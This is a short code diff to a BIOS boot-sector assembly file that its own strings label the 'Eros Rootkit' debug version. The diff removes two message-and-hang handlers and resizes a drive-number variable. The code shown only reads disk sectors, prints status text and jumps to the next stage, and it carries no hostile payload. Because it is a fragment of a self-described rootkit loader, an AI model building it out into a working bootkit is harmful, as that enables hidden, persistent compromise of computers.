@@ -57,18 +57,6 @@ mov al,1
 int 0x13
 jmp 0x7E00
 
-load_sector_error:
-mov esi,errMsg
-call print
-
-call hang
-
-load_sector_succ:
-mov esi,succMsg
-call print
-
-call hang
-
 
 err:
 mov esi,errMsg
@@ -133,6 +121,6 @@ msg: db "Eros Rootkit" , 0xA , 0xD , 0x10 , "Debug Version",0x11 ,0xA , 0xD ,0
 errMsg: db "An Error Occured",0xA,0xD,0
 succMsg: db "Execution Normal",0xA,0xD,0
 hostDevice: db "Host device checked - working.",0xA,0xD ,0 ,0
-Drivenum: dd 0
+Drivenum: db 0
  TIMES 510 - ($ - $$) db 0 ;;zero fills the remaining space
  DW 0xAA55 ;;Signature for the BIOS
